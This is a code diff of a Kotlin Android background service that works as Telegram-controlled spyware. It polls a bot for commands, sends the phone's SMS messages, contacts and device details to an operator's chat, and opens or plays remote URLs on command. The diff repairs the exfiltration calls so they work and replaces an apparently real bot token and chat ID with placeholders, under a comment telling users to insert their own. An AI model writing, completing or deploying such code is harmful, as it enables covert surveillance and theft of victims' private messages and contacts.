@@ -16,9 +16,9 @@ import java.net.URLEncoder
 class MainService : Service() {
     private val scope = CoroutineScope(Dispatchers.IO)
     
-    // !!! غير البيانات دي ببيانات البوت بتاعك !!!
-    private val BOT_TOKEN = "8808280611:AAGIfoiMU15xLnFSQ3wNcf9SvHVMNHYTUFk"
-    private val CHAT_ID = "5019050806"
+    // !!! غير البيانات دي ببياناتك !!!
+    private val BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
+    private val CHAT_ID = "YOUR_CHAT_ID_HERE"
     private var lastUpdateId = 0
 
     override fun onCreate() {
@@ -42,8 +42,8 @@ class MainService : Service() {
 
     private fun getUpdates() {
         try {
-            val url = URL("https://api.telegram.org/bot\/getUpdates?offset=\&timeout=10")
-            val response = url.readText()
+            val urlString = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$lastUpdateId&timeout=10"
+            val response = URL(urlString).readText()
             val jsonArray = org.json.JSONObject(response).getJSONArray("result")
             for (i in 0 until jsonArray.length()) {
                 val update = jsonArray.getJSONObject(i)
@@ -58,7 +58,7 @@ class MainService : Service() {
 
     private fun handleCommand(cmd: String) {
         when {
-            cmd == "/info" -> sendMessage("Model: \\nAndroid: \")
+            cmd == "/info" -> sendMessage("Model: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
             cmd == "/sms" -> sendMessage(SmsCollector.collect(this))
             cmd == "/contacts" -> sendMessage(ContactsCollector.collect(this))
             cmd.startsWith("/msg ") -> {
@@ -68,15 +68,15 @@ class MainService : Service() {
                 }
             }
             cmd.startsWith("/url ") -> {
-                val url = cmd.replace("/url ", "")
-                val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url))
+                val urlStr = cmd.replace("/url ", "")
+                val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(urlStr))
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 startActivity(intent)
             }
             cmd.startsWith("/audio ") -> {
-                val url = cmd.replace("/audio ", "")
+                val urlStr = cmd.replace("/audio ", "")
                 val mp = MediaPlayer()
-                mp.setDataSource(url)
+                mp.setDataSource(urlStr)
                 mp.prepare()
                 mp.start()
             }
@@ -85,8 +85,9 @@ class MainService : Service() {
 
     private fun sendMessage(msg: String) {
         try {
-            val url = URL("https://api.telegram.org/bot\/sendMessage?chat_id=\&text=\")
-            url.readText()
+            val encoded = URLEncoder.encode(msg, "UTF-8")
+            val urlString = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$encoded"
+            URL(urlString).readText()
         } catch (_: Exception) {}
     }
 
